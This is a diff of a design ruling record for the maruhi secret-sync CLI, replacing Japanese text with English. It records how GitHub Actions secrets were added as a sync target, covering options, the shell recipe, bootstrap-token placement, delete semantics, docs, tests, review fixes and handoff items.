-名前(Netlify の `context` は別の意味なので別名 — SY4 裁定 B の規律の裏)。`describeDestination`(sync-plan.ts)は `options.environment`
-をヘッダー行に出すので gh も自動で載る。**`app`**: `actions`(既定)/ `agents` / `codespaces` / `dependabot` = gh の閉集合を
-そのまま(`agents` を外す理由が無い — 1 語で gh が検査する)。`org` / `visibility` / `user` / `repos` は**入れない**(組織 secrets は
-`admin:org` の資格と別の権限モデルで、需要が出たら第一級にするか裁定。docs で「use gh directly」)。**`isProduction`** の列挙:
-(i) 常に true / (ii) `environment === "production"`(Vercel と同じ)/ (iii) **`environment` 未指定 = リポジトリ secrets = true、
-指定あり = 名前が `production` のとき true**。第 1 周: なし。第 2 周(壊れ方): (ii) はリポジトリ secrets(全 workflow に効く =
-production のデプロイにも効く)を `--yes` 無しで書ける。(i) は staging Environment の secrets にまで `--yes` を課し、`onPush:
-"apply"` を全ターゲットで塞ぐ。(iii) は Workers(名前付き環境なし = production)と Vercel(`production` の名前)の両方の規則の
-合成で、Dependabot / Codespaces secrets(リポジトリ単位)も production 扱い(`production: false` で上書き可)(なし)。**選定 = (iii)**。
+**D. Options and the production default** — `repo` enumeration: (i) required / (ii) **optional (gh resolves it from cwd's git remote; on ambiguity gh stops)** / (iii) optional + a `sync init` note. Round-1 new option: none. Round 2 (failure modes): (i) makes the most ordinary shape — "writing to the very repo the config is committed in" — redundantly write `OWNER/REPO`. (ii)'s "plaintext's destination changes with cwd" follows the existing discipline of Vercel's linked directory / wrangler's config file (config `cwd` is relative to the config file, and the output keeps `Running gh in <cwd>`); run it in a fork's clone and it writes to the fork, but what's writable is only what the writer's login can write. With multiple remotes gh doesn't silently pick (premise (3)) (no). **Chosen = (ii)**; docs say "without it gh uses the git remote of the directory it runs in, and stops if that directory has several remotes". **`environment`**: a GitHub Environment (`--env`). Same meaning as Vercel's `environment` ("deployment environment") so the same name (Netlify's `context` is a different meaning so a different name — the flip side of SY4 ruling B's discipline). `describeDestination` (sync-plan.ts) prints `options.environment` on the header line, so gh rides automatically. **`app`**: `actions` (default) / `agents` / `codespaces` / `dependabot` = gh's closed set as-is (no reason to drop `agents` — gh checks it in one word). `org` / `visibility` / `user` / `repos` are **not included** (org secrets are a different credential / permission model (`admin:org`); if demand appears, rule whether to make it first-class. docs say "use gh directly"). **`isProduction`** enumeration: (i) always true / (ii) `environment === "production"` (same as Vercel) / (iii) **`environment` unspecified = repository secrets = true; specified = true when the name is `production`**. Round 1: none. Round 2 (failure modes): (ii) lets repository secrets (affecting every workflow = also affecting a production deploy) be written without `--yes`. (i) imposes `--yes` even on staging-Environment secrets and blocks `onPush: "apply"` on every target. (iii) is a composition of both Workers' (no named environments = production) and Vercel's (the name `production`) rules; Dependabot / Codespaces secrets (repo-level) also count as production (overridable via `production: false`) (no). **Chosen = (iii)**.
 
-**E. 第 1 段レシピの形** — 列挙: (i) **Vercel と同じ `sh -c` の 2 段ループ**(全名前の存在検査 → `printenv "$name" | gh secret set
-"$name"`)/ (ii) `gh secret set -f -` の dotenv 一括(**採らない** — 値の所在の規律 + dotenv の解釈で壊れる)/ (iii) 名前ごとに
-`maruhi run --only` を回す(`--only` は無い)。第 1 周の新案: なし。第 2 周(壊れ方): `printenv` の末尾改行は gh が落とす(単行・
-複数行とも — 前提 (2))ので、レシピの注記は「PEM の末尾改行は届かない」。大文字小文字は「Names arrive in uppercase … keep the
-names in maruhi uppercase and distinct」。`--body`(argv)と `--env-file -`(dotenv)を「使わない」と明記。fine-grained PAT の
-permission 3 種を箇条書きに(前提 (7))。`--env` / `--app` はコマンド行に足す位置を prose で(ブロックは 1 つ)(なし)。**選定 = (i)**。
-`recipes.test.ts`: 偽 `gh`(`shims/gh.ts` = `recordVendorCall("gh")` + `bin/gh`。`.fallowrc.json` の glob が既に `shims/*.ts` を
-entry に含む)で 3 態(正常 = 名前ごと 1 呼び出し・argv は `["secret","set",NAME]`・stdin = 値 + 改行 / 欠落名 = 1 件も送る前に 1 /
-xtrace = 外側と内側の `sh -x` に値が出ない)× 4 シェル(この環境に zsh を入れて sh / bash / zsh / dash で 40 件)。レシピの数の
-断言を 2 → 3 に。レシピ内の変数名は節の例(`NPM_TOKEN` / `CODECOV_TOKEN`)で、値は Vercel の態と同じ字種を写す。
+**E. The stage-1 recipe's shape** — enumeration: (i) **the same `sh -c` 2-stage loop as Vercel** (check all names exist → `printenv "$name" | gh secret set "$name"`) / (ii) `gh secret set -f -`'s dotenv bulk (**not taken** — the value-location discipline + breaks under dotenv's interpretation) / (iii) loop `maruhi run --only` per name (`--only` doesn't exist). Round-1 new option: none. Round 2 (failure modes): `printenv`'s trailing newline is dropped by gh (single-line and multi-line alike — premise (2)), so the recipe's note is "a PEM's trailing newline doesn't arrive". Case: "Names arrive in uppercase … keep the names in maruhi uppercase and distinct". `--body` (argv) and `--env-file -` (dotenv) are explicitly "not used". The 3 fine-grained PAT permissions are bulleted (premise (7)). `--env` / `--app` are described in prose as additions to the command line (the block stays single) (no). **Chosen = (i)**. `recipes.test.ts`: a fake `gh` (`shims/gh.ts` = `recordVendorCall("gh")` + `bin/gh`. `.fallowrc.json`'s glob already includes `shims/*.ts` as entries) with 3 cases (normal = one call per name, argv = `["secret","set",NAME]`, stdin = value + newline / missing name = 1 before sending anything / xtrace = no value on the outer or inner `sh -x`) × 4 shells (zsh installed in this environment; sh / bash / zsh / dash = 40 cases). The recipe-count assertion went 2 → 3. In-recipe variable names use the section's example (`NPM_TOKEN` / `CODECOV_TOKEN`); values transcribe the same character classes as the Vercel case.
 
-**F. 第 2 段 CI の形(bootstrap トークンの置き場と渡し方)** — 列挙: (i) **GitHub secret に fine-grained PAT を置き、標準形 ② の
-sync step の `env: GH_TOKEN: ${{ secrets.GH_SECRETS_TOKEN }}`**(唯一の例外。`workflows.test.ts` の `secrets.` 禁止をこの 1 か所
-だけ許す)/ (ii) PAT を maruhi の `tokens` 環境に置き、入れ子 `maruhi ci run --env tokens -- maruhi ci sync <target>`(GitHub
-secrets ゼロ)/ (iii) `actions/create-github-app-token` で App の短命トークン(GitHub secret に残るのは App の秘密鍵 = やはり 1 つ +
-SHA ピンの action 1 つ)/ (iv) step を別 job / 別 workflow に。第 1 周の新案: **(v) (i) の PAT を**リポジトリ secret でなく
-**ターゲットの GitHub Environment の secret** に置く(あり — 標準形 ② は `environment: ${{ matrix.target }}` なので、その
-Environment の required reviewers が bootstrap トークンの**払い出し**も守る〔Environment secrets は job 開始時 = 承認後に読まれる —
-前提 (6)〕。他のターゲットの job では `${{ secrets.GH_SECRETS_TOKEN }}` は空文字(前提 (6))になり、Vercel の http の job に PAT が
-届かない。step を分けずに済み〔(iv) 不要〕、リポジトリ secret なら write 権限の誰でも workflow 編集で持ち出せる形も避ける)。
-第 2 周(壊れ方): (ii) は SY3 申し送り (5) のとおり**未検証**(内側の OIDC 端点の継承・トークン 2 本・リース 3 回・stdio)で、
-matrix の step が gh ターゲットだけ違う形になるか、全 leg を `ci run --env tokens --` で包んで他ベンダーのトークンが gh の env に
-入る形になる。「GitHub secrets を空にする」の目標には最も近いが、検証なしにテンプレートへ載せない(SY1 の「検証していないことを
-書かない」)→ 申し送りのまま。(iii) は差し替え可能な後段(補足 8 Q1)で、初回のテンプレートには action の SHA ピンと App 登録の
-手順が増える → docs で「a GitHub App installation token with the same permissions works too」の 1 文(前提 (7) の一次資料の範囲)。
-**再帰**: gh ターゲットが `variables: "all"` で bootstrap と同じ名前の maruhi 変数を運べば自分のトークンを上書きする → docs で
-「The target must not write its own bootstrap」。**`GH_TOKEN` の優先順位**: ランナーは `GITHUB_TOKEN` を環境変数に置かない
-(前提 (8))ので競合なし。**権限の境界**: fine-grained PAT は 1 リポジトリに絞れ、Secrets / Environments / Dependabot secrets の
-write だけ(前提 (7))。**四眼**: Environment 名 = ターゲット名(SY3 裁定 D)のまま。**concurrency**: 既存の group で直列(なし)。
-**選定 = (i) + (v)**。secret 名は `GH_SECRETS_TOKEN`(`GITHUB_` 接頭辞は GitHub が拒む・`GH_TOKEN` そのままは環境変数名と混ざる)。
-`workflows.test.ts` は「`secrets.` の参照は `maruhi sync` workflow の `secrets.GH_SECRETS_TOKEN` ちょうど 1 つ、それを env に持つ
-step は 1 つで maruhi を実行する step、他の 2 workflow は 0」と断言し、`expectMaruhiStepKeepsValues` の env の検査は `GH_TOKEN`
-キーだけこの式を許す。棄却: (ii)(未検証)、(iii)(後段)、(iv)(不要になった)。
+**F. Stage-2 CI's shape (where the bootstrap token lives and how it's passed)** — enumeration: (i) **a fine-grained PAT on a GitHub secret, `env: GH_TOKEN: ${{ secrets.GH_SECRETS_TOKEN }}` on standard form ②'s sync step** (the sole exception. `workflows.test.ts`'s `secrets.` prohibition is waived for this one place) / (ii) PAT in maruhi's `tokens` environment, nested `maruhi ci run --env tokens -- maruhi ci sync <target>` (zero GitHub secrets) / (iii) an App's short-lived token via `actions/create-github-app-token` (what stays as a GitHub secret is the App's private key = still 1 + 1 SHA-pinned action) / (iv) split the step into another job / workflow. Round-1 new option: **(v) place (i)'s PAT not on a repository secret but on the target's GitHub Environment's secret** (available — standard form ② is `environment: ${{ matrix.target }}`, so that Environment's required reviewers also guard the bootstrap token's **disbursement**〔Environment secrets are read at job start = post-approval — premise (6)〕. On other targets' jobs `${{ secrets.GH_SECRETS_TOKEN }}` is the empty string (premise (6)), so no PAT reaches Vercel's http job. No step split needed〔(iv) unnecessary〕, and the shape "anyone with write can take a repository secret by editing the workflow" is avoided). Round 2 (failure modes): (ii) is **unverified** per SY3 handoff (5) (inner OIDC-endpoint inheritance, 2 tokens, 3 leases, stdio), and either matrix steps differ only for the gh target, or every leg gets wrapped in `ci run --env tokens --` putting other vendors' tokens into gh's env. Closest to the "empty GitHub secrets" goal, but it doesn't go on the template unverified (SY1's "don't write what isn't verified") → stays a handoff. (iii) is a later-stage substitute (supplement 8 Q1); putting it in the first template adds an action SHA pin and App-registration steps → docs get one line: "a GitHub App installation token with the same permissions works too" (within premise (7)'s primary source). **Recursion**: if the gh target carries `variables: "all"` including a maruhi variable with the same name as the bootstrap, it overwrites its own token → docs say "The target must not write its own bootstrap". **`GH_TOKEN` precedence**: the runner doesn't set `GITHUB_TOKEN` as an env var (premise (8)), so no contention. **Permission boundary**: a fine-grained PAT can be scoped to 1 repo, with only Secrets / Environments / Dependabot secrets write (premise (7)). **Four-eyes**: Environment name = target name stays (SY3 ruling D). **concurrency**: serialized by the existing group (no). **Chosen = (i) + (v)**. The secret name is `GH_SECRETS_TOKEN` (the `GITHUB_` prefix is refused by GitHub; `GH_TOKEN` as-is would blend with the env var name). `workflows.test.ts` asserts "exactly 1 `secrets.` reference = `secrets.GH_SECRETS_TOKEN` in the `maruhi sync` workflow, carried by 1 step which is the maruhi-running step; the other 2 workflows have 0", and `expectMaruhiStepKeepsValues`'s env check allows this expression on the `GH_TOKEN` key only. Rejected: (ii) (unverified), (iii) (a later stage), (iv) (became unnecessary).
 
-**G. 削除の意味論** — `gh secret delete NAME`(名前で消す = 一覧不要 — 一方通行の規律にそのまま乗る)。不在名は HTTP 404 = 非 0
-(前提 (4))= Vercel の `env rm` と同じ wart。列挙: (i) **既存の `failDriver` の案内(レシートの作り直し + 未試行の削除の名指し)で
-足りる** / (ii) 宣言に「不在は成功扱い」を表す口を足す(全プリセット)/ (iii) gh 専用。第 1 周: なし。第 2 周: (ii) は「ネット
-ワーク起因の失敗でも消すべき秘密が同期先に残る」= SY2 改訂 2 で棄却した理由がそのまま当たる(gh の出力から 404 だけを読み分ける
-のは出力の形式に依存する)(なし)。**選定 = (i)**。CI は削除しない(既存)。
+**G. Delete semantics** — `gh secret delete NAME` (deletes by name = no listing needed — rides the one-way discipline as-is). An absent name is HTTP 404 = nonzero (premise (4)) = the same wart as Vercel's `env rm`. Enumeration: (i) **the existing `failDriver` guidance (rebuild the receipt + name the untried deletes) suffices** / (ii) add a declaration expressing "absent counts as success" (all presets) / (iii) gh-specific. Round 1: none. Round 2: (ii) = "on a network-caused failure, a secret that should be deleted stays at the destination" — the reason rejected in SY2 revision 2 applies as-is (distinguishing just the 404 from gh's output depends on the output format) (no). **Chosen = (i)**. CI never deletes (existing).
 
-**H. docs** — deploy-targets.mdx: 冒頭 / `description` に GitHub Actions、「How maruhi sync works」の preset 列挙と `gh auth login`、
-`--yes` の production の定義、設定の表(`preset` / `driver` / `command`)、GitHub Actions のオプション段落、**新節「GitHub Actions
-secrets」**(位置づけ = `ci run` で借りられない secrets だけ〔Q2 / Q3〕、`gh secret set` / `delete`・封印はクライアント・http が無い
-理由・`GH_TELEMETRY`・設定例 + `sync init` の 1 行・Environment は作らない・末尾改行の拒否・大文字の名前・48 KB と 100 件は API・
-名前で削除・org / user は `gh` を直接)、http 節の冒頭に「github-actions has no http driver」、「Without maruhi sync」に**レシピ節**、
-「Vendor CLI telemetry」に `gh config set telemetry disabled` / `GH_TELEMETRY=false`。github-actions.mdx: 冒頭に例外の 1 文、
-「Sync a deploy target from CI」に 3 つ目の箇条(GitHub 自身が同期先)、標準形 ② の step に `GH_TOKEN` + コメント、**新節「GitHub
-secrets as a target」**(Q2 の目標 → 届かないもの 3 種 → Q3 → 設定の断片 → `SCHEDULED_TARGETS` に足す → 2 点: bootstrap は唯一の
-例外〔`GITHUB_TOKEN` に `secrets` permission が無い・fine-grained PAT の 3 permission・Environment secret に置く理由・`GH_TOKEN` の
-優先順位・期限と回転〕/ 自分の bootstrap を書かない)、「What can go wrong」に gh の 4 / 401 / 403 / 404 と maruhi の拒否
-(末尾改行・名前)。index の Card / getting-started の Next steps / README の Docs 一覧に 1 句ずつ。
+**H. docs** — deploy-targets.mdx: GitHub Actions in the top / `description`, "How maruhi sync works"'s preset enumeration and `gh auth login`, `--yes`'s production definition, the config table (`preset` / `driver` / `command`), the GitHub Actions options paragraph, **a new "GitHub Actions secrets" section** (positioning = only the secrets `ci run` can't lease〔Q2 / Q3〕, `gh secret set` / `delete`, sealing is client-side, why there's no http, `GH_TELEMETRY`, a config example + a `sync init` line, doesn't create Environments, trailing-newline refusal, uppercase names, 48 KB and 100 items are the API's, deletes by name, org / user = use `gh` directly), "github-actions has no http driver" at the http section's head, a **recipe section** in "Without maruhi sync", `gh config set telemetry disabled` / `GH_TELEMETRY=false` in "Vendor CLI telemetry". github-actions.mdx: one exception sentence at the top, a 3rd bullet in "Sync a deploy target from CI" (GitHub itself as a destination), `GH_TOKEN` + a comment on standard form ②'s step, **a new "GitHub secrets as a target" section** (Q2's goal → the 3 kinds it can't reach → Q3 → the config fragment → add to `SCHEDULED_TARGETS` → 2 points: the bootstrap is the sole exception〔`GITHUB_TOKEN` has no `secrets` permission, the fine-grained PAT's 3 permissions, why it's placed on an Environment secret, `GH_TOKEN` precedence, expiry and rotation〕/ don't write your own bootstrap), gh's 4 / 401 / 403 / 404 and maruhi's refusals (trailing newline, names) in "What can go wrong". One phrase each on index's Card / getting-started's Next steps / README's Docs list.
 
-**I. テスト** — `sync-units.test.ts`: 設定の検証(exec のみ・production の 5 態・`repo` / `environment` / `app` の形・`environment` ×
-`app` の整合・`token` の拒否・`driver: "http"` の理由つき拒否・HOST/OWNER/REPO)、`buildInvocations`(argv の `--repo` / `--env` /
-`--app`・stdin = 値・delete・`GH_ENV`・オプション無しの素の形)、`checkValueConstraints`(末尾 LF / CRLF / CR・複数行・`"\n"` だけ /
-空と 70,000 バイトは通す / 名前 8 拒否 + 5 受理)、宣言の走査(値のトークンの不在 — 既存の断言が新プリセットも走る)。
-`sync-command.test.ts`: apply の通し 2 態(リポジトリ secrets = `--yes`・argv に値なし・stdin・`GH_ENV`・cwd・レシート・`gh secret
-delete` / 末尾改行の BETA と小文字名 `apiKey` は「Nothing was sent」で 0 起動)。`ci-sync.test.ts`: exec の gh 1 態(`--env staging`・
-`extraEnv` は `GH_ENV` だけ = `GH_TOKEN` は継承)。`sync-init.test.ts`: 往復(`repo` / `app`)・`--driver http` の 2・`environment` ×
-`codespaces` の 2・`signInHint` の Note。`--help` golden(`--preset` / `--driver` の文言)。`message-style.test.ts`・
-`redacted.test.ts` の棚卸し表は**変更なし**(`sync-exec.ts: 3` のまま — 新プリセットは `Redacted` に触れない)。`recipes.test.ts`
-(裁定 E)・`workflows.test.ts`(裁定 F)。fallow: `workflows.test.ts` の `secrets.` の検査は `expectedBootstrap` /
-`bootstrapCarriers` / `secretReferences` に割って CRAP 閾値内。
+**I. Tests** — `sync-units.test.ts`: config validation (exec only, the 5 production cases, `repo` / `environment` / `app` shapes, `environment` × `app` consistency, `token` refusal, reasoned `driver: "http"` refusal, HOST/OWNER/REPO), `buildInvocations` (argv's `--repo` / `--env` / `--app`, stdin = value, delete, `GH_ENV`, the bare no-option shape), `checkValueConstraints` (trailing LF / CRLF / CR, multi-line, only `"\n"`, empty and 70,000 bytes pass, 8 name refusals + 5 acceptances), declaration scanning (value-token absence — the existing assertion covers the new preset). `sync-command.test.ts`: 2 apply end-to-end cases (repository secrets = `--yes`, no value on argv, stdin, `GH_ENV`, cwd, receipt, `gh secret delete` / BETA with a trailing newline and lowercase `apiKey` get "Nothing was sent" with 0 launches). `ci-sync.test.ts`: 1 exec gh case (`--env staging`, `extraEnv` is `GH_ENV` only = `GH_TOKEN` is inherited). `sync-init.test.ts`: round trip (`repo` / `app`), `--driver http` = 2, `environment` × `codespaces` = 2, the `signInHint` Note. `--help` golden (`--preset` / `--driver` wording). `message-style.test.ts`, `redacted.test.ts`'s inventory table **unchanged** (still `sync-exec.ts: 3` — the new preset doesn't touch `Redacted`). `recipes.test.ts` (ruling E), `workflows.test.ts` (ruling F). fallow: `workflows.test.ts`'s `secrets.` check was split into `expectedBootstrap` / `bootstrapCarriers` / `secretReferences` to fit the CRAP threshold.
 
-**J. 検証** — `FALLOW_AUDIT_BASE=origin/main bun run check`(7 段: 115 files / 2,846 tests)。`apps/site` の `validate --strict` /
-`build` / `e2e`(Chromium: `~/.cache/ms-playwright` の 1243 を 1.62.1 が期待する 1234 の名前でリンク)。docs の light / dark の
-スクリーンショットと、偽 gh に対する `sync plan / apply` の出力例は所有者向けの非公開 Artifact。実リポジトリでの `gh secret set`
-の通し(レシピ・プリセット・CI の step)は**人間タスク**(この環境の gh トークンは secrets を読めない)。
+**J. Verification** — `FALLOW_AUDIT_BASE=origin/main bun run check` (7 stages: 115 files / 2,846 tests). `apps/site`'s `validate --strict` / `build` / `e2e` (Chromium: `~/.cache/ms-playwright`'s 1243 linked under the name 1234 which 1.62.1 expects). docs light / dark screenshots and sample `sync plan / apply` output against the fake gh are private artifacts for the owner. Running `gh secret set` on a real repo (the recipe, the preset, the CI step) is a **human task** (this environment's gh token can't read secrets).
 
-**K. ROADMAP と裁定録** — SY5 行を完了注記へ(`- [x]`)。補足 5 の結論に実装状況、SY1 実測表の gh 行に「SY5 で実装」。本節は SY4 の
-後、`## 4.` の前。**所有者への確認事項**: SY1〜SY5 が揃った = ROADMAP 完了条件の SY 系列が閉じる。**SY4 全体を `- [x]` にするか**
-(第 1 波 = Netlify で完了扱い、残り候補は需要駆動 — SY4 裁定 K の提案)と、それに伴い SY 系列の親項目を `- [x]` にするかは
-所有者判断(本 PR では SY5 行だけを閉じた)。
+**K. ROADMAP and ruling record** — the SY5 row becomes a completion note (`- [x]`). Supplement 5's conclusion gains implementation status; SY1's measurement table's gh row gains "implemented in SY5". This section sits after SY4's, before `## 4.`. **Owner-confirmation items**: SY1–SY5 being complete = the ROADMAP completion condition's SY family closing. **Whether to mark all of SY4 `- [x]`** (wave 1 = Netlify counts as complete; remaining candidates are demand-driven — SY4 ruling K's proposal) and, following that, whether to mark the SY family's parent item `- [x]` are
+the owner's call (this PR closed only the SY5 row).
 
-**不変条件の確認**: 仕様改訂なし・依存ゼロ(暗号操作の追加なし。libsodium 系 / `@noble/*` / WASM を足していない。サーバー・Web・
-チェーン・wire・`packages/crypto`・レシートの形式は無変更。`preset` 許容値は `PRESET_IDS` から追随)/ 値の所在(値は gh の stdin
-だけ。`--body` / `-f -` は使わず、`ArgTemplate` に値のトークンは無い〔型 + 走査テスト〕。`$GITHUB_ENV` / `$GITHUB_OUTPUT` に書かない。
-`Redacted` を剥がす箇所は増えていない — 棚卸し表据え置き)/ 宣言的プリセットの規律(gh は `EXEC_PRESETS` の宣言 1 つ。型の一般化
-= `trailingNewline` / `name` / `OptionSpec.pattern` / `ExecPreset.check` / `signInHint` は全プリセットに効き、`buildInvocations` /
-`runInvocations` / `sync-plan.ts` に gh の分岐は無い)/ GitHub secrets を空に(bootstrap 1 つだけを例外として docs で位置づけ、
-maruhi トークンを GitHub secret に置く形・`$GITHUB_ENV` で渡す形は案内しない)/ 一方通行(同期先を読み戻さない。削除は名前で。
-CI は削除しない)/ production(リポジトリ secrets と Environment `production` は `--yes`。四眼は SY3 の形にそのまま載る)/
-テレメトリ off(`GH_ENV` を sync-exec.ts に置き `gh secret set` と `gh workflow run` で共有。レシピは docs で案内)/ ADR-0016 /
-ADR-0017(型付きエラー・stdout はコマンドの出力だけ・文言は英語・golden / message-style)/ エージェント環境の扱いは無変更 /
-スコープ(SY4 の残り・`--all`・`sync diff`・ネイティブ封印・GitLab / CircleCI・組織 secrets・sync-plan.ts の 3 点は取り込まない)。
+**Invariant check**: no spec revision, zero dependencies (no crypto operations added. No libsodium-family / `@noble/*` / WASM. Server / web / chain / wire / `packages/crypto` / the receipt format unchanged. `preset` allowed values follow `PRESET_IDS`) / where values live (values go only to gh's stdin. `--body` / `-f -` unused; `ArgTemplate` has no value token〔type + scanning test〕. Nothing written to `$GITHUB_ENV` / `$GITHUB_OUTPUT`. No new `Redacted` unwrap sites — the inventory table stays) / the declarative-preset discipline (gh is one `EXEC_PRESETS` declaration. The type generalization = `trailingNewline` / `name` / `OptionSpec.pattern` / `ExecPreset.check` / `signInHint` benefits all presets; `buildInvocations` / `runInvocations` / `sync-plan.ts` have no gh branches) / empty GitHub secrets (the bootstrap is the one exception, positioned as such in docs; neither "put the maruhi token on a GitHub secret" nor "pass it via `$GITHUB_ENV`" is guided) / one-way (never reads back the destination. Deletes by name. CI doesn't delete) / production (repository secrets and Environment `production` require `--yes`. Four-eyes rides SY3's shape as-is) / telemetry off (`GH_ENV` lives in sync-exec.ts, shared by `gh secret set` and `gh workflow run`. The recipe is guided in docs) / ADR-0016 / ADR-0017 (typed errors, stdout is only the command's output, English wording, golden / message-style) / agent-environment handling unchanged / scope (SY4's remainder, `--all`, `sync diff`, native sealing, GitLab / CircleCI, org secrets, the 3 sync-plan.ts items not pulled in).
 
-**改訂 1(2026-09-08、pullfrog の初回レビュー〔92be3d3〕)**: (1) `isProduction` が Environment 名を `=== "production"` で
-比べていたが、**GitHub の Environment 名は大文字小文字を区別しない**(docs「Managing environments for deployment」: 「Environment
-names are not case sensitive」)ので、`Production` / `PRODUCTION` の Environment が `--yes` の門をすり抜けていた → 小文字に畳んで
-比べる(態を 2 つ追加)。secret 名で既に採っている「大小を畳む」の規律を Environment 名にも。(2) `repo` の regex が先頭 `-` を
-通していた(`-x/y` が一致。コメントは「構造で除く」と言っていた — pflag は `--repo` の次のトークンを無条件に値として取るので実害
-は無いが、コードとコメントの不一致)→ 各区切りの先頭を英数字に(態を 2 つ追加)。(3) 名前の制約を plan の `!` にも載せる提案
-(名前だけで判定でき平文が要らない。いまは `plan` で `+` に見え `apply` で「Nothing was sent」)— `classifyVariable` = sync-plan.ts
-の変更なので**所有者確認事項**として申し送り (3) に据え置き(pullfrog 自身も「追認と優先度の提案」)。docs の「GitHub Actions
-secrets」節に「`plan` はまだこの名前に印を付けず、`apply` が送る前に拒む」の 1 文を足して、`!` の定義とのずれを隠さない。
-(4) pullfrog の nit: `buildChildEnvironment` は `MARUHI_*` 以外の親環境を全部ベンダー CLI の子に渡すので、bootstrap の
-`GH_TOKEN` を**リポジトリ secret** に置くと他の leg の `ci sync` が起動する wrangler / vercel にも届く(Environment secret なら
-他 leg では空文字)→ github-actions.mdx の bootstrap の箇条に「リポジトリ secret だと全 job と exec ターゲットのベンダー CLI に
-届く(maruhi は `MARUHI_*` 以外を子に渡す)」の 1 文を足し、Environment secret に置く理由をもう 1 つ明示。
+**Revision 1 (2026-09-08, pullfrog's first review〔92be3d3〕)**: (1) `isProduction` was comparing the Environment name with `=== "production"`, but **GitHub's Environment names are case-insensitive** (docs "Managing environments for deployment": "Environment names are not case sensitive"), so `Production` / `PRODUCTION` Environments were slipping through the `--yes` gate → now compared after folding to lowercase (2 cases added). The "fold case" discipline already adopted for secret names now applies to Environment names too. (2) `repo`'s regex was allowing a leading `-` (`-x/y` matched. The comment said "excluded structurally" — pflag takes the token after `--repo` unconditionally as the value so there's no real harm, but code and comment disagreed) → each segment's head is now alphanumeric (2 cases added). (3) A suggestion to surface the name constraint on plan's `!` too (judgeable from the name alone, no plaintext needed. Currently it shows `+` on plan then "Nothing was sent" on apply) — `classifyVariable` = a sync-plan.ts change, so kept as an **owner-confirmation item** in handoff (3) (pullfrog itself called it "a ratification and priority suggestion"). docs' "GitHub Actions secrets" section gained one line "`plan` doesn't yet mark such a name; `apply` refuses before sending" so the divergence from `!`'s definition isn't hidden. (4) pullfrog's nit: `buildChildEnvironment` passes all non-`MARUHI_*` parent env to the vendor CLI's child, so putting the bootstrap `GH_TOKEN` on a **repository secret** reaches the wrangler / vercel that other legs' `ci sync` launches (an Environment secret is the empty string on other legs) → github-actions.mdx's bootstrap bullet gained "on a repository secret it reaches every job and every exec target's vendor CLI (maruhi passes everything except `MARUHI_*` to children)" — one more explicit reason to place it on an Environment secret.
 
-**確認できなかったこと(人間タスクに追加)**: **実リポジトリでの `gh secret set` の通し**(レシピ・`sync apply` の gh ターゲット・
-標準形 ② の gh ターゲット〔Environment secret の `GH_SECRETS_TOKEN` が承認後の job にだけ届くこと・他の leg で空文字になること〕)、
-空 stdin に対する API の応答、48 KB の単位(平文か封印後か)、不在 Environment に対する公開鍵取得の status、`gh secret delete` の
-不在名の文面、fine-grained PAT の Dependabot secrets / Environments permission で実際に書けること、`gh` 2.100.0 以降の
-`TrimRight` の不変(trunk は同一 — 版が上がれば再確認)。
+**Could not confirm (added to human tasks)**: **running `gh secret set` on a real repo** (the recipe, `sync apply`'s gh target, standard form ②'s gh target〔that the Environment secret's `GH_SECRETS_TOKEN` reaches only post-approval jobs and is the empty string on other legs〕), the API's response to empty stdin, the 48 KB unit (plaintext or sealed), the public-key-fetch status on an absent Environment, `gh secret delete`'s absent-name wording, whether a fine-grained PAT's Dependabot secrets / Environments permissions actually write, `TrimRight`'s invariance past gh 2.100.0 (trunk is identical — re-verify when the version bumps).
 
-**次への申し送り(SY5 完了 = SY 系列が揃う)**: (1) **入れ子 `maruhi ci run --env tokens -- maruhi ci sync <target>`**(GitHub
-secrets を**真に**空にする形。bootstrap を maruhi の変数に置き、gh ターゲットの leg だけ包む)は未検証のまま。検証するなら:
-内側の `ci sync` が `ACTIONS_ID_TOKEN_REQUEST_*` を継承して自分でリースできること(`buildChildEnvironment` は `MARUHI_*` だけを
-落とす)、トークン 2 本・リース 3 回の窓、外側が注入した他ベンダーのトークンが gh の env に入らない形(専用の環境)、剥がし箇所の
-棚卸し。実機での通しが先。(2) **SY4 の残り**(Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages)は需要駆動。
-(3) **sync-plan.ts の 3 点**(SY4 申し送り (3))+ 本セッションで見つけた 2 点: plan の `classifyVariable` に名前の制約(`constraints.
-name`)を載せて `!` で示す(いまは apply で「Nothing was sent」)、`describeDestination` に `repo`(gh)/ `context`(Netlify)を出す
-一般化(プリセットに `describe`)。**→ 済(下の「SY 系列の締め」— 2026-09-08)**。(4) 組織 secrets(`--org` / `--visibility` / `--repos`)は需要が出たら裁定(権限モデルが別)。
-(5) `actions/create-github-app-token` への差し替え手順(補足 8 Q1)は実機で通してから docs に。(6) 既存の未消化: `gh workflow run`
-の実機、Windows の実行体解決、実アカウント(Cloudflare / Vercel / Netlify)での通し、Vercel の一覧のページ分け、macOS のパイプ容量、
-`vercel env rm` の不在名、SY3 の workflow 2 本の実機、Free / Pro / Team の private リポジトリの required reviewers、文言の好み。
+**Handoff to what's next (SY5 complete = the SY family is assembled)**: (1) **Nested `maruhi ci run --env tokens -- maruhi ci sync <target>`** (the shape that makes GitHub secrets **truly** empty — the bootstrap lives as a maruhi variable, and only the gh target's leg is wrapped) stays unverified. To verify: the inner `ci sync` inherits `ACTIONS_ID_TOKEN_REQUEST_*` and can lease itself (`buildChildEnvironment` drops only `MARUHI_*`); the 2-token / 3-lease window; a shape where other vendors' tokens injected by the outer don't enter gh's env (a dedicated environment); the unwrap-site audit. A real-machine run comes first. (2) **SY4's remainder** (Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages) is demand-driven. (3) **sync-plan.ts's 3 points** (SY4 handoff (3)) + the 2 found this session: put the name constraint (`constraints.name`) on plan's `classifyVariable` and mark it `!` (currently apply's "Nothing was sent"); generalize `describeDestination` to print `repo` (gh) / `context` (Netlify) (give presets a `describe`). **→ Done (see "Closing the SY family" below — 2026-09-08)**. (4) Org secrets (`--org` / `--visibility` / `--repos`) get a ruling when demand appears (a different permission model). (5) The swap procedure to `actions/create-github-app-token` (supplement 8 Q1) goes into docs after a real-machine run. (6) Existing carried-over items: `gh workflow run` on a real machine, Windows executable resolution, real-account runs (Cloudflare / Vercel / Netlify), Vercel listing pagination, macOS pipe capacity, `vercel env rm`'s absent name, SY3's 2 workflows on a real repo, required reviewers on Free / Pro / Team private repos, wording preferences.
 
-### SY 系列の締め(sync-plan.ts の積み残し 5 点)— 実装時の裁定録(2026-09-08)
+### Closing the SY family (the 5 deferred sync-plan.ts items) — implementation-time ruling record (2026-09-08)
 
